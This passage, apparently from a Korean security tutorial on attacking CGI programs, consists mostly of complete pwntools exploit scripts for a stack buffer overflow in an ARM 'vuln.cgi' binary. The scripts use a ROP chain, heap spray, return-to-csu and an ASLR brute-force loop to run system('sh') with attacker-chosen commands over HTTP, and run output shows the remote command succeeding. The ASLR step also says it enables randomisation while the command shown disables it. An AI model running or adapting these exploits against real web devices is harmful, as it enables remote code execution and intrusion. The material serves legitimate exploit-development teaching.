<span class="k">def</span> <span class="nf">payload</span><span class="p">(</span><span class="n">r11</span><span class="p">,</span> <span class="n">lr</span><span class="p">,</span> <span class="n">dummy_len</span><span class="o">=</span><span class="mi">54</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="n">dummy_len</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r11</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">lr</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">payload</span>

<span class="k">def</span> <span class="nf">chain</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r1</span><span class="p">,</span> <span class="n">r2</span><span class="p">):</span>
    <span class="n">c</span> <span class="o">=</span> <span class="s">''</span>
    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="c1"># r4
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">func</span><span class="p">)</span>       <span class="c1"># [r5] =&gt; r3
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="c1"># r6
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r0</span><span class="p">)</span>         <span class="c1"># r7 =&gt; r0
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r1</span><span class="p">)</span>         <span class="c1"># r8 =&gt; r1
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r2</span><span class="p">)</span>         <span class="c1"># r9 =&gt; r2
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="c1"># r10
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">csu_2</span><span class="p">)</span>      <span class="c1"># pc
</span>    <span class="k">return</span> <span class="n">c</span>

<span class="k">def</span> <span class="nf">spray</span><span class="p">():</span>

    <span class="c1"># If we already got spray buffer, use it.
</span>    <span class="k">global</span> <span class="n">spray_fix</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">spray_fix</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">spray_fix</span>

    <span class="c1"># Return-to-csu.
</span>    <span class="n">rop</span> <span class="o">=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">csu_1</span><span class="p">)</span>

    <span class="c1"># Set bss:0x20 to get_val address.
</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">addr</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x20</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
        <span class="n">value</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'get_val'</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
        <span class="n">rop</span> <span class="o">+=</span> <span class="n">chain</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'memset'</span><span class="p">],</span> <span class="n">addr</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

    <span class="c1"># get_val("t", bss:0x24, 2): returns "sh"
</span>    <span class="n">rop</span> <span class="o">+=</span> <span class="n">chain</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x20</span><span class="p">),</span> <span class="n">str_t</span><span class="p">,</span> <span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x24</span><span class="p">),</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># get_val
</span>    
    <span class="c1"># system("sh")
</span>    <span class="n">rop</span> <span class="o">+=</span> <span class="n">chain</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'system'</span><span class="p">],</span> <span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x24</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

    <span class="c1"># Forming spray.
</span>    <span class="n">spray</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="p">(</span><span class="n">SPRAY_LEN</span> <span class="o">%</span> <span class="n">EADDR_LEN</span><span class="p">)</span> <span class="c1"># padd
</span>    <span class="n">spray</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">sled_1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(((</span><span class="n">SPRAY_LEN</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span> <span class="o">//</span> <span class="n">EADDR_LEN</span><span class="p">)</span><span class="o">-</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">spray</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">sled_2</span><span class="p">)</span> <span class="o">+</span> <span class="n">purl32</span><span class="p">(</span><span class="n">sled_1</span><span class="p">)</span> <span class="o">+</span> <span class="s">"AAAA"</span>
    <span class="n">spray</span> <span class="o">+=</span> <span class="n">rop</span>

    <span class="c1"># Fix the spray buffer.
</span>    <span class="n">spray_fix</span> <span class="o">=</span> <span class="n">spray</span>

    <span class="k">return</span> <span class="n">spray</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>

    <span class="c1"># ifconfig's output length is not fixed.
</span>    <span class="c1"># So, we need to get the buffer first to calculate
</span>    <span class="c1"># the overflow size.
</span>    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Getting buffer."</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="n">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">form_param</span><span class="p">())</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="n">r</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"- ifconfig"</span><span class="p">):</span><span class="n">r</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n\n</span><span class="s">"</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
    <span class="n">dummy_len</span> <span class="o">=</span> <span class="mh">0x204</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Exploit."</span><span class="p">)</span>
    <span class="n">stack</span>  <span class="o">=</span> <span class="mh">0xbefe1db4</span><span class="o">+</span><span class="mi">4</span>
    <span class="n">pload</span>  <span class="o">=</span> <span class="n">payload</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="n">leave</span><span class="p">,</span> <span class="n">dummy_len</span><span class="p">)</span>
    <span class="n">param</span>  <span class="o">=</span> <span class="n">form_param</span><span class="p">(</span><span class="n">pload</span><span class="p">,</span> <span class="n">spray</span><span class="p">())</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="n">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Success!"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">):</span>
        <span class="n">exploit</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"{} [target-ip] [shell command]"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bc@machine $ ./exploit.py 172.16.13.9 'echo PWNED &gt; /tmp/pwned'
[*] '/mnt/c/Users/314ckC47/Documents/CGI Exploitation/source/vuln'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
[*] Getting buffer.
[*] Exploit.
[*] Success!
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/314ckC47 $ cat /tmp/pwned
PWNED
</code></pre></div></div>

<h3 id="case-aslr-활성화">Case: ASLR 활성화</h3>

<p>다음과 같이 ASLR을 활성화합니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># echo 0 &gt; /proc/sys/kernel/randomize_va_space
# cat /proc/sys/kernel/randomize_va_space
0
</code></pre></div></div>

<h4 id="종료-조건">종료 조건</h4>

<p><code class="language-plaintext highlighter-rouge">sp</code>가 참조하는 지점에 대해 Brute-forcing을 수행합니다.
Brute-forcing의 종료 조건을 위해 ROP Payload가 성공적으로 수행 될 경우 프로그램을 abort시켜 500 Internal error를 발생시키지 않도록 합니다.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># system("sh")
</span>    <span class="n">rop</span> <span class="o">+=</span> <span class="n">chain</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'system'</span><span class="p">],</span> <span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x24</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

    <span class="c1"># abort
</span>    <span class="n">rop</span> <span class="o">+=</span> <span class="s">"AAAA"</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="n">purl32</span><span class="p">(</span><span class="n">abort</span><span class="p">)</span>
</code></pre></div></div>

<h4 id="aslr-공격-코드">ASLR 공격 코드</h4>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./vuln"</span><span class="p">)</span>

<span class="c1"># Globals &amp; Defines
</span><span class="n">spray_fix</span> <span class="o">=</span> <span class="s">''</span>
<span class="n">SPRAY_LEN</span> <span class="o">=</span> <span class="mh">0xf000</span>
<span class="n">EADDR_LEN</span> <span class="o">=</span> <span class="mi">12</span>

<span class="c1"># Gadgets
</span><span class="n">sled_1</span> <span class="o">=</span> <span class="mh">0x00010ca4</span> <span class="c1"># pop {r11, pc}
</span><span class="n">sled_2</span> <span class="o">=</span> <span class="mh">0x000108e0</span> <span class="c1"># pop {r4, r11, pc}
</span><span class="n">csu_1</span>  <span class="o">=</span> <span class="mh">0x00010d28</span>
<span class="n">csu_2</span>  <span class="o">=</span> <span class="mh">0x00010d0c</span>
<span class="n">leave</span>  <span class="o">=</span> <span class="mh">0x00010ca0</span> <span class="c1"># sub sp, r11, 4; pop {r11, pc}
</span>
<span class="c1"># ETC.
</span><span class="n">str_t</span> <span class="o">=</span> <span class="mh">0x00010e66</span>
<span class="n">abort</span> <span class="o">=</span> <span class="mh">0x0001055c</span>

<span class="k">def</span> <span class="nf">purl32</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
    <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0x000000ff</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">0</span>
    <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0x0000ff00</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
    <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0x00ff0000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span>
    <span class="n">d</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xff000000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span>
    <span class="k">return</span> <span class="s">"%{:02x}%{:02x}%{:02x}%{:02x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">content</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
    <span class="n">packet</span>  <span class="o">=</span> <span class="s">""</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"POST http://{}/vuln.cgi?{} HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Host: {}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Connection: keep-alive</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Content-Length: {}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"User-Agent: Mozilla/5.0</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept: */*</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Origin: http://{}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Referer: http://{}/home.cgi</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="n">content</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="k">return</span> <span class="n">packet</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">form_param</span><span class="p">(</span><span class="n">payload</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">spray</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
    <span class="n">p</span> <span class="o">=</span> <span class="p">[</span><span class="s">"t=sh"</span><span class="p">,</span> <span class="s">"ifconfig=y"</span><span class="p">]</span>
    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">"comment="</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">spray</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">"ss="</span><span class="o">+</span><span class="n">spray</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">"&amp;"</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">payload</span><span class="p">(</span><span class="n">r11</span><span class="p">,</span> <span class="n">lr</span><span class="p">,</span> <span class="n">dummy_len</span><span class="o">=</span><span class="mi">54</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="n">dummy_len</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r11</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">lr</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">payload</span>

<span class="k">def</span> <span class="nf">chain</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r1</span><span class="p">,</span> <span class="n">r2</span><span class="p">):</span>
    <span class="n">c</span> <span class="o">=</span> <span class="s">''</span>
    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="c1"># r4
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">func</span><span class="p">)</span>       <span class="c1"># [r5] =&gt; r3
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="c1"># r6
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r0</span><span class="p">)</span>         <span class="c1"># r7 =&gt; r0
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r1</span><span class="p">)</span>         <span class="c1"># r8 =&gt; r1
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r2</span><span class="p">)</span>         <span class="c1"># r9 =&gt; r2
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="c1"># r10
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">csu_2</span><span class="p">)</span>      <span class="c1"># pc
</span>    <span class="k">return</span> <span class="n">c</span>

<span class="k">def</span> <span class="nf">spray</span><span class="p">():</span>

    <span class="c1"># If we already got spray buffer, use it.
</span>    <span class="k">global</span> <span class="n">spray_fix</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">spray_fix</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">spray_fix</span>

    <span class="c1"># Return-to-csu.
</span>    <span class="n">rop</span> <span class="o">=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">csu_1</span><span class="p">)</span>

    <span class="c1"># Set bss:0x20 to get_val address.
</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">addr</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x20</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
        <span class="n">value</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'get_val'</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
        <span class="n">rop</span> <span class="o">+=</span> <span class="n">chain</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'memset'</span><span class="p">],</span> <span class="n">addr</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

    <span class="c1"># get_val("t", bss:0x24, 2): returns "sh"
</span>    <span class="n">rop</span> <span class="o">+=</span> <span class="n">chain</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x20</span><span class="p">),</span> <span class="n">str_t</span><span class="p">,</span> <span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x24</span><span class="p">),</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># get_val
</span>
    <span class="c1"># system("sh")
</span>    <span class="n">rop</span> <span class="o">+=</span> <span class="n">chain</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'system'</span><span class="p">],</span> <span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x24</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

    <span class="c1"># abort
</span>    <span class="n">rop</span> <span class="o">+=</span> <span class="s">"AAAA"</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="n">purl32</span><span class="p">(</span><span class="n">abort</span><span class="p">)</span>

    <span class="c1"># Forming spray.
</span>    <span class="n">spray</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="p">(</span><span class="n">SPRAY_LEN</span> <span class="o">%</span> <span class="n">EADDR_LEN</span><span class="p">)</span> <span class="c1"># padd
</span>    <span class="n">spray</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">sled_1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(((</span><span class="n">SPRAY_LEN</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span> <span class="o">//</span> <span class="n">EADDR_LEN</span><span class="p">)</span><span class="o">-</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">spray</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">sled_2</span><span class="p">)</span> <span class="o">+</span> <span class="n">purl32</span><span class="p">(</span><span class="n">sled_1</span><span class="p">)</span> <span class="o">+</span> <span class="s">"AAAA"</span>
    <span class="n">spray</span> <span class="o">+=</span> <span class="n">rop</span>

    <span class="c1"># Fix the spray buffer.
</span>    <span class="n">spray_fix</span> <span class="o">=</span> <span class="n">spray</span>

    <span class="k">return</span> <span class="n">spray</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>

    <span class="c1"># ifconfig's output length is not fixed.
</span>    <span class="c1"># So, we need to get the buffer first to calculate
</span>    <span class="c1"># the overflow size.
</span>    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Getting buffer."</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="n">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">form_param</span><span class="p">())</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="n">r</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"- ifconfig"</span><span class="p">):</span><span class="n">r</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n\n</span><span class="s">"</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
    <span class="n">dummy_len</span> <span class="o">=</span> <span class="mh">0x204</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Exploit."</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">stack</span>  <span class="o">=</span> <span class="mh">0xbefe1dd4</span>
        <span class="n">pload</span>  <span class="o">=</span> <span class="n">payload</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="n">leave</span><span class="p">,</span> <span class="n">dummy_len</span><span class="p">)</span>
        <span class="n">param</span>  <span class="o">=</span> <span class="n">form_param</span><span class="p">(</span><span class="n">pload</span><span class="p">,</span> <span class="n">spray</span><span class="p">())</span>
        <span class="n">packet</span> <span class="o">=</span> <span class="n">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
        <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
        <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s">"200 OK"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
            <span class="k">break</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Success!"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">):</span>
        <span class="n">exploit</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"{} [target-ip] [shell command]"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
</code></pre></div></div>

<h2 id="끝내면서">끝내면서</h2>

<p>CGI를 공격하는 방법에 대해 알아보았습니다. 일반적으로 웹 CGI 프로그램 혹은 CGI는 문자열을 처리하는 코드가 많습니다. 문자열을 처리하는 코드에서 주로 발생할 수 있는 String copy buffer overflow의 공격 방법에 대해 알아보았고, 안정적인 공격 코드를 작성하는 법에 대해 알아 보았습니다.</p>

<p>추가적인 질문 사항과 수정사항은 dhkim@stealien.com으로 남겨 주시면 감사하겠습니다.</p>

<hr />

<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:2" role="doc-endnote">
      <p>https://www.lighttpd.net/ <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:3" role="doc-endnote">
      <p><a href="http://www.cgi101.com/book/ch3/text.html">CGI Envrionment Variables</a> <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:4" role="doc-endnote">
